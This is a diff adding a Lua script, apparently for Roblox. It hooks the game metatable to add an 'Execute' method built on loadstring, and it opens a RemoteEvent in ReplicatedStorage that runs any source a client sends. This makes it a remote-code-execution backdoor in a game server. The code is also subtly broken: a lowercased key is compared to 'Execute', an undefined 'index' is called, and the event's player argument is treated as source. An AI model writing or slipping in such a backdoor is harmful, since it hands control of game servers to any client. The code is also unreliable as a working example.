@@ -1,0 +1,45 @@
+Begin = function()
+ 
+local gMetatable = getrawmetatable(game)
+ 
+local Index = function(self, k)
+    local Function = string.lower(k)
+    if Function == "Execute" then
+    return function(self, source)
+        return { loadstring(source)() }
+        end
+    end
+end
+ 
+local o_Index = gMetatable.__index
+gMetatable.__index = function(self, k)
+    local v = index(self, k)
+    if v then
+    return v
+    end
+    return o_Index(self, k)
+end
+ 
+local o_Namecall = gMetatable.__namecall
+gMetatable.__namecall = function(self, ...)
+    local args = {...}
+    local method = table.remove(args)
+ 
+    if type(method) == "string" then
+    local ret = Index(self, method)
+    if ret then
+    return ret(self, unpack(args))
+    end
+    end
+    return o_Namecall(self, ...)
+end
+ 
+ 
+local RemoteEvent = Instance.new("RemoteEvent")
+RemoteEvent.Parent=game.ReplicatedStorage
+ 
+RemoteEvent.OnServerEvent:connect(function(Source)
+    game:Execute(Source)
+end)
+end
+spawn(function() Begin() end)
